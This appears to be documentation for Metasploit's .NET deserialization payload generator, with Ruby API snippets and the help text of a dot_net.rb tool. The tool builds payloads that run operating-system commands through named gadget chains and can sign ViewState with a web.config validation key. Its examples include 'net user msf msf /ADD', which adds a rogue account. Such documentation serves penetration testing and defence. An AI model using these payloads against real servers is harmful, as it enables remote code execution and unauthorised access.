## Support Matrix
## Basic Usage
options specific to their respective chain or formatter.
```ruby
stream = generate_gadget_chain(cmd, gadget_chain)
formatted = generate_formatted(stream, formatter)
```

### Example Usage
formatted with the `LosFormatter`.
```ruby
serialized = ::Msf::Util::DotNetDeserialization.generate(
 cmd,  # this is the Operating System command to run
 gadget_chain: :TextFormattingRunProperties,
 formatter: :LosFormatter
)
```

## Command Line Tool
Help output:
```
Usage: ./dot_net.rb [options]

Generate a .NET deserialization payload that will execute an operating system
command using the specified gadget chain and formatter.

Available formatters:
  * BinaryFormatter
  * LosFormatter
  * SoapFormatter

Available gadget chains:
  * ClaimsPrincipal
  * DataSet
  * DataSetTypeSpoof
  * ObjectDataProvider
  * TextFormattingRunProperties
  * TypeConfuseDelegate
  * WindowsIdentity

Available HMAC algorithms: SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5

Examples:
  ./dot_net.rb -c "net user msf msf /ADD" -f BinaryFormatter -g TypeConfuseDelegate -o base64
  ./dot_net.rb -c "calc.exe" -f LosFormatter -g TextFormattingRunProperties \
    --viewstate-validation-key deadbeef --viewstate-validation-algorithm SHA1

General options:
    -h, --help                       Show this message
    -c, --command   <String>         The command to run
    -f, --formatter <String>         The formatter to use (default: BinaryFormatter)
    -g, --gadget    <String>         The gadget chain to use (default: TextFormattingRunProperties)
    -o, --output    <String>         The output format to use (default: raw, see: --list-output-formats)
        --list-output-formats        List available output formats, for use with --output

ViewState related options:
        --viewstate-generator             <String>
                                     The ViewState generator string to use
        --viewstate-validation-algorithm  <String>
                                     The validation algorithm (default: SHA1, see: Available HMAC algorithms)
        --viewstate-validation-key        <HexString>
                                     The validationKey from the web.config file
```

